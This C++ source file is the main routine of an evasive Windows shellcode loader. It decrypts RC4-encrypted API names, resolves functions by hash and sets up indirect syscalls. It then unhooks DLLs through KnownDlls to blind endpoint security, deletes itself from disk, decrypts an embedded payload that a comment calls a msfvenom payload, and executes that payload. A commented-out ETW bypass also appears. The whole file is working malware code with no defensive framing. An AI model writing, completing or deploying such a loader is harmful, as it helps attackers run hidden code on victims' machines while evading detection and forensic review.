#include "ResolveFunctionsDynamically.hpp"
#include "SelfDelete.h"
#include "aes.hpp"
#include "HellsHall.h"
#include "MemoryManipulation.hpp"
#include "StringManipulation.hpp"
#include "ApiHashing.hpp"
#include "Common.h"
#include "Rc4.h"
#include "StringRandomizer.h"

extern "C" {
#include "ExecutePayload.h"
#include "Unhooking.h"
}

#define DEBUGMAIN 0

#if DEBUGMAIN
#define PRINTA( STR, ... )                                                                  \
    if (1) {                                                                                \
        LPSTR buf = (LPSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );           \
        if ( buf != NULL ) {                                                                \
            int len = wsprintfA( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleA( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }  

#define PRINTW( STR, ... )                                                                  \
    if (1) {                                                                                \
        LPWSTR buf = (LPWSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );           \
        if ( buf != NULL ) {                                                                \
            int len = wsprintf( buf, STR, __VA_ARGS__ );                                   \
            WriteConsole( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }  

#endif //DEBUGMAIN

VOID InitFunctionTableHashes(pFunctionTable FuncTable, PNTAPI_FUNC_TABLE NtFuncTable, unsigned char* DecryptedString)
{
	
	WCHAR StrK32WStr[30];
	WCHAR StrK32WStr2[30];
	WCHAR StrNtdllWStr[30];
	WCHAR StrNtdllW2Str[30];
	CHAR CloseHandleStr[30];
	CHAR CreateFileWStr[30];
	CHAR GetModuleFileNameWStr[30];
	CHAR SetFileInformationByHandleStr[30];
	CHAR HeapAllocStr[30];
	CHAR GetProcessHeapStr[30];

	ZeroMemoryEx(StrK32WStr, sizeof(WCHAR) * 30);
	ZeroMemoryEx(StrK32WStr2, sizeof(WCHAR) * 30);
	ZeroMemoryEx(StrNtdllWStr, sizeof(WCHAR) * 30);
	ZeroMemoryEx(StrNtdllW2Str, sizeof(WCHAR) * 30);
	ZeroMemoryEx(CloseHandleStr, 30);
	ZeroMemoryEx(CreateFileWStr, 30);
	ZeroMemoryEx(GetModuleFileNameWStr, 30);
	ZeroMemoryEx(SetFileInformationByHandleStr, 30);
	ZeroMemoryEx(HeapAllocStr, 30);
	ZeroMemoryEx(GetProcessHeapStr, 30);



	NtFuncTable->g_Key = RandomCompileTimeSeed() % 0xFF;
	FuncTable->g_KEY = NtFuncTable->g_Key;
	NtFuncTable->SEEDLING = SEED;

	//init common module name hashes.
	CharStringToWCharString(StrK32WStr, (StringLocateCharA((PCHAR)DecryptedString, '|', 0) - 9), 9);
	CopyMemoryEx(StrK32WStr2, StrK32WStr, 18);
	StringTerminateStringAtCharW(StrK32WStr2, '|');
	FuncTable->dwK32NameHash = RTIME_HASHW(StrK32WStr2, NtFuncTable->g_Key);

	CharStringToWCharString(StrNtdllWStr, (StringLocateCharA((PCHAR)DecryptedString, '|', 1) - 6), 6);
	CopyMemoryEx(StrNtdllW2Str, StrNtdllWStr, 12);
	StringTerminateStringAtCharW(StrNtdllW2Str, '|');
	NtFuncTable->dwNtDllHash = RTIME_HASHW(StrNtdllW2Str, NtFuncTable->g_Key);

	//init the function name hashes.
	CopyMemoryEx(CloseHandleStr, (StringLocateCharA((PCHAR)DecryptedString, '|', 3) - 12), 12);
	StringTerminateStringAtCharA(CloseHandleStr, '|');
	FuncTable->CloseHandle.dwFuncNameHash					= RTIME_HASHA(CloseHandleStr, NtFuncTable->g_Key);
	
	CopyMemoryEx(CreateFileWStr, (StringLocateCharA((PCHAR)DecryptedString, '|', 4) - 12), 12);
	StringTerminateStringAtCharA(CreateFileWStr, '|');
	FuncTable->CreateFileW.dwFuncNameHash					= RTIME_HASHA(CreateFileWStr, NtFuncTable->g_Key);

	CopyMemoryEx(GetModuleFileNameWStr, (StringLocateCharA((PCHAR)DecryptedString, '|', 5) - 19), 19);
	StringTerminateStringAtCharA(GetModuleFileNameWStr, '|');
	FuncTable->GetModuleFileNameW.dwFuncNameHash			= RTIME_HASHA(GetModuleFileNameWStr, NtFuncTable->g_Key);

	CopyMemoryEx(SetFileInformationByHandleStr, (StringLocateCharA((PCHAR)DecryptedString, '|', 6) - 27), 27);
	StringTerminateStringAtCharA(SetFileInformationByHandleStr, '|');
	FuncTable->SetFileInformationByHandle.dwFuncNameHash	= RTIME_HASHA(SetFileInformationByHandleStr, NtFuncTable->g_Key);

	CopyMemoryEx(HeapAllocStr, (StringLocateCharA((PCHAR)DecryptedString, '|', 7) - 10), 10);
	StringTerminateStringAtCharA(HeapAllocStr, '|');
	FuncTable->HeapAlloc.dwFuncNameHash						= RTIME_HASHA(HeapAllocStr, NtFuncTable->g_Key);

	CopyMemoryEx(GetProcessHeapStr, (StringLocateCharA((PCHAR)DecryptedString, '|', 8) - 15), 15);
	StringTerminateStringAtCharA(GetProcessHeapStr, '|');
	FuncTable->GetProcessHeap.dwFuncNameHash				= RTIME_HASHA(GetProcessHeapStr, NtFuncTable->g_Key);

	return;

}

int main()
{

	Rc4Context ctx;
	PBYTE RC4Key;

	ZeroMemoryEx(&ctx, sizeof(Rc4Context));

	if (BruteForceDecryption(HINTBYTECOMMON, 0, (PBYTE)ASCIIEncryptedKeyStream, KeyLengthA, &RC4Key) == NULL)
		return NULL;
	rc4Init(&ctx, (const unsigned char* )RC4Key, KeyLengthA);
	unsigned char* EncryptedStringA = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (DataLengthA));

#if DEBUGMAIN
	//rc4Cipher(&ctx, NecessaryASCIIStrings, EncryptedStringA, DataLengthA);
	//PrintHexData("NecessaryEncryptedASCIIStrings", EncryptedStringA, DataLengthA);
#endif //DEBUGMAIN

	unsigned char* DecryptedStringA = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (DataLengthA));
	rc4Cipher(&ctx, NecessaryEncryptedASCIIStrings, DecryptedStringA, DataLengthA);


	//initialize our tables with zero's for later usage.
	NTDLL_CONFIG NtdllConf;
	NTAPI_FUNC_TABLE SysCallTable;
	FunctionTable FuncTable;

	ZeroMemoryEx(&NtdllConf, sizeof(NTDLL_CONFIG));
	ZeroMemoryEx(&SysCallTable, sizeof(NTAPI_FUNC_TABLE));
	ZeroMemoryEx(&FuncTable, sizeof(FunctionTable));

	//initialize our payload buffer that will hold our decrypted payload.
	BYTE decryptedPayload[1000];
	ZeroMemoryEx(decryptedPayload, sizeof(decryptedPayload));

	//functions to start table initialization for later usage by other functions.
	InitFunctionTableHashes(&FuncTable, &SysCallTable, DecryptedStringA);
	if (!InitNtdllConfigStructure(&NtdllConf))
		return -1;

	if (!InitNTSysCallsTable(&SysCallTable, &NtdllConf))
		return -2;

	if (!InitFunctionTable(&FuncTable))
		return -3;

	//unhook dll's through 'known dlls' global object.
	if (!UnhookDll(&SysCallTable, DecryptedStringA))
		return -4;

	//bypass ETW Using Hardware breakpoints. - not a stealthy implementation. Got lazy.
	//if (!BypassETW())
	//	return -5;

	//delete ourselves from disk.
	if (!DeleteSelf(&FuncTable))
		return -5;

	//payload must first be decrypted.
	if (CopyMemoryEx(decryptedPayload, Decrypt(), 688) == NULL)
		return -6;

	//execute our msfvenom payload.
	if (!ExecutePayload(SysCallTable, decryptedPayload, 688))
		return -7;

	return 0;
}